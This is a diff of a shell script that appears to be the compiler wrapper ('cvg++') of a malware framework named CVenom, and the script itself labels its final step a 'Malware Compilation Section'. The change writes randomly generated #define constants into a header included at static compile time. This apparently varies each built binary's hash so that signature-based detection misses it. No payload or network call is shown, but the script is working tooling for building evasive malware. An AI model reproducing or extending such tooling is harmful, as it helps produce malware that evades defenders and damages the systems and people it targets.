@@ -3,8 +3,10 @@
 
 outputfile="./a.out"
 otrig=0
-random="~/.CVenom/PSBinaries/Linux/dr_RETi"
-dyn_hds="#define RZ_STACK   $($random)
+random="$HOME/.CVenom/PSBinaries/Linux/dr_RETi"
+dyn_hds="// this header is randomly generated at compile time.
+
+#define RZ_STACK   $($random)
 #define RZ_HEAP    $($random)
 #define RZ_TEXT_1  long int Rz1=$($random)+$($random)-$($random)
 #define RZ_TEXT_2  long int Rz2=$($random)+$($random)-$($random)
@@ -12,8 +14,9 @@ dyn_hds="#define RZ_STACK   $($random)
 #define RZ_RO_DATA $($random)
 #define RZ_RW_DATA $($random)
 "
-printf "$dyn_hds"
-exit 0
+
+printf "$dyn_hds" > $HOME/.CVenom/CTDynamic/dyn_s2hashes.hxx
+
 function fatal(){
 	printf "\033[1;37mcvg++:\033[1;31m fatal error:\033[0;97m $1\n"
 }
@@ -66,5 +69,5 @@ done
 
 # Malware Compilation Section (For Windows And Linux, Android And iOS Aren't Currently Supported)
 
-$compiler -Wall -static -I ~/.CVenom/$CVPath/ $@
+$compiler -Wall -static -I ~/.CVenom/$CVPath/ -I ~/.CVenom/CTDynamic/ $@
 $striper $outputfile
